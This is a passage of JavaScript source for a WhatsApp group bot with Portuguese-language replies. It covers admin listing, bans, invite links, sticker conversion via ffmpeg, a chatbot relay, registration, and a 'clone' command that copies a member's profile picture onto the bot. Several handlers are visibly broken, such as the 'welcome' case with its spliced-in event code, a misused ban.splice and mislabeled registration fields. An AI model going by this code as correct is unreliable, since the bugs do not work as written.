					no = 0

					for (let admon of groupAdmins) {

						no += 1

						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`

					}

					mentions(teks, groupAdmins, true)

					break




case 'setppbot':

  Pin.updatePresence(from, Presence.composing)

  if (!isOwner) return reply(mess.only.ownerB)

  const botpp = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contxtInfo: mek

  const cuk = await Pin.downloadAndSaveMediaMessage(botpp)

  await Pin.updateProfilePicture(botNumber, cuk)

  reply('FOT DE PERFIL ALTERADA✅')

  break



//--Mengambil link grup

    case 'linkgr':

    case 'linkgrupo':

        if (!isGroup) return reply(mess.only.group)

        if (!isGroupAdmins) return reply(mess.only.admin)

        if (!isBotGroupAdmins) return reply(mess.only.Badmin)

        linkgc = await Pin.groupInviteCode(from)

        reply('LINK AQ MENDINGO 🙄🙄 https://chat.whatsapp.com/'+linkgc)

                    break



//--bot kita

      case 'suicide':

      if (!isGroup) return reply(mess.only.group)

      if (isGroupAdmins || isOwner) {

      Pin.groupLeave(from)

                    } else {

      reply(mess.only.admin)

                    }

                    break



//--Convert stiker to image

				case 'toimg':

					if (!isQuotedSticker) return reply('Responder o adesivo')

					if (!isRegister) return reply(mess.only.daftarB)

					reply(mess.wait)

					imgmed = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo

					medimg = await Pin.downloadAndSaveMediaMessage(imgmed)

					ran = getRandom('.png')

					exec(`ffmpeg -i ${medimg} ${ran}`, (err) => {

						fs.unlinkSync(medimg)

						if (err) return reply('erro:/')

						buffer = fs.readFileSync(ran)

						Pin.sendMessage(from, buffer, image, {quoted: mek, caption: 'convertido para imagem com sucesso✔'})

						fs.unlinkSync(ran)

					})

					break


                     
                    


                



			case 'ban':
if (!isGroup) return reply(mess.only.group)
if (!isOwner) return reply('*Este comando só pode ser usado pelo o dono 🌚🤙🏼 * ')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return 
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
ban.push(`${mentioned}`)
fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
susp = `🚫@${mentioned[0].split('@')[0]} foi banido e você não poderá mais usar comandos do bot🚫`
mentions(`${susp}`, mentioned, true)   
break

case 'unban':
if (!isGroup) return reply(mess.only.group)
if (!isOwner) return reply('*Este comando só pode ser usado pelo o dono 🌚🤙🏼 * ')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return 
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
ban.splice(`${mentioned}`)
fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
susp = `❎@${mentioned[0].split('@')[0]}foi desbloqueado e você pode reutilizar os comandos do bot❎`
mentions(`${susp}`, mentioned, true)   
break






//--Simsimi talk
				case 'simi':
					if (args.length < 1) return reply('Onde está o texto, hum?')
					teks = body.slice(5)
					anu = await simih(teks) //fetchJson(`https://mhankbarbars.herokuapp.com/api/samisami?text=${teks}`, {method: 'get'})
					//if (anu.error) return reply('Simi ga tau kak')
					reply(anu)
					break
				case 'simih':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Hmmmm')
					if (Number(args[0]) === 1) {
						if (isSimi) return reply('O modo Simi está ativo')
						samih.push(from)
						fs.writeFileSync('./src/simi.json', JSON.stringify(samih))
						reply('Ativado com sucesso o modo simi neste grupo 😗️')
					} else if (Number(args[0]) === 0) {
						samih.splice(from, 1)
						fs.writeFileSync('./src/simi.json', JSON.stringify(samih))
						reply('Desativado modo simi com sucesso neste grupo 😡️')
					} else {
						reply('1 para ativar, 0 para desativar, lerdao vc em KKKKKK')
					}
					break
				



case 'bot':

					if (args.length < 1) return reply(`Salve eai como posso ti ajuda ${pushname}`)

					teks = body.slice(5)

					try { 

					anu = await fetchJson(`https://simsumi.herokuapp.com/api?text=${teks}`, {method: 'get'})

					if (anu.error) return reply('Simi ga tau kak')

					reply(anu.jawaban)

					} catch {

					  reply(mess.ferr)

					}

					break

//--Verifkasi
case '25389569':

case 'cadastra':

case 'verify':

case 'daftar':

  case 'register':

if (isRegister) return reply('tua conta ja ta verificada mano')

const namaUser = `${pushname}`

const umurUser = `${sender}`

const serialUser = createSerial(20)

veri = sender

if (isGroup) {

  addRegisteredUser(sender, namaUser, umurUser, time, serialUser)


  console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(namaUser, 'cyan'), 'Age:', color(umurUser, 'cyan'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))

} else {

  addRegisteredUser(sender, namaUser, umurUser, time, serialUser)  

  console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(namaUser, 'cyan'), 'Age:', color(umurUser, 'cyan'), 'Serial:', color(serialUser, 'cyan'))

}

tm = `a verificação está completa, digite *${prefix}Menu* para exibir a lista do menu`

reply(tm)

break
 



//--grup semua peserta

case 'closegc':

  Pin.updatePresence(from, Presence.composing)

  if (!isGroup) return reply(mess.only.group)

  if (!isGroupAdmins) return reply(mess.only.admin)

  if (!isBotGroupAdmins) return reply(mess.only.Badmin)

  var nomor = mek.participant

  const close = {

text: `Grupo fechado pelo administrador @${nomor.split("@s.whatsapp.net")[0]}\nagora *apenas administrador* quem pode enviar mensagens`,

contextInfo: {

  mentionedJid: [nomor]

}

  }

  Pin.groupSettingChange (from, GroupSettingChange.messageSend, true);

  reply(close)

  break



//--grup hanya admin

case 'opengc':

  case 'bukagc':

Pin.updatePresence(from, Presence.composing)

if (!isGroup) return reply(mess.only.group)

if (!isGroupAdmins) return reply(mess.only.admin)

if (!isBotGroupAdmins) return reply(mess.only.Badmin)

open = {

  text: `Grupo aberto pelo administrador @${sender.split("@")[0]}\nagora *todos os participantes* pode enviar mensagens`,

  contextInfo: {

mentionedJid: [sender]

  }

}

Pin.groupSettingChange (from, GroupSettingChange.messageSend, false)

Pin.sendMessage(from, open, text, {

  quoted: mek

})

break



//---mengahapus pesan bot

case 'delete':

  case 'del':


if (!isOwner) return reply(mess.only.ownerB)

try {

Pin.deleteMessage(from, {

  id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true

})

} catch {

  reply('Só pode deletar mensagens minhas')

}

break









				case 'welcome':

					if (!isGroup) return reply(mess.only.group)

					if (!isGroupAdmins) return reply(mess.only.admin)

					if (args.length < 1) return reply('Hmmmm')

					if (Number(args[2]) === 1) {

						if (isWelkom) return reply('Já ativo um')

						welkom.push(from)

						fs.writeFileSync('./data/welkom.json', JSON.stringify(welkom))
						


		if (!welkom.includes(anu.jid)) return
		
  try {

ppimg = await Pin.getProfilePicture(`${sender.split('@')[0]}@c.us`)

  } catch {

ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg@'

  }

  teks = `‣ *foto* :👆👆
  
  ‣ *Nama* : ${pushname}

  ‣ *teu numero* : ${sender.split("@")[0]}

  ‣ *Link* : wa.me/${sender.split("@")[0]}`

  its = await getBuffer (ppimg)

  Pin.sendMessage(from, its, image, {

quoted: mek, caption: teks

  })

						reply('Ativou com sucesso o recurso de boas-vindas neste grupo')
					}
                                      break

				case 'clone':

					if (!isGroup) return reply(mess.only.group)

					if (!isOwner) return reply(mess.only.ownerB)

					if (args.length < 1) return reply('Tag target')

					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag cvk')

					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]

					let { jid, id, notify } = groupMembers.find(x => x.jid === mentioned)

					try {

						pp = await Pin.getProfilePicture(id)

						buffer = await getBuffer(pp)

						Pin.updateProfilePicture(botNumber, buffer)

						mentions(`Foto do perfil atualizada com sucesso usando a foto do perfil @${id.split('@')[0]}`, [jid], true)

					} catch (e) {

						reply('Gagal om')

					}

					break

				case 'wait':

					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {

						reply(mess.wait)

						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek

						media = await Pin.downloadMediaMessage(encmedia)

						await wait(media).then(res => {

							Pin.sendMessage(from, res.video, video, {quoted: mek, caption: res.teks.trim()})

						}).catch(err => {

							reply(err)

						})

					} else {

						reply('use uma foto')

					}

					break





				default:

				if (body.startsWith(`${prefix}${command}`)) {

  reply

				}

					if (isGroup && isSimi && budy != undefined) {

						console.log(budy)

						muehe = await simih(budy)

						console.log(muehe)

						reply(muehe)

					} else {
						console.log(color('[ERROR]','red'), 'eita krai comando não registrado de', color(sender.split('@')[0]))
					}
                           }
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})
}


starts()

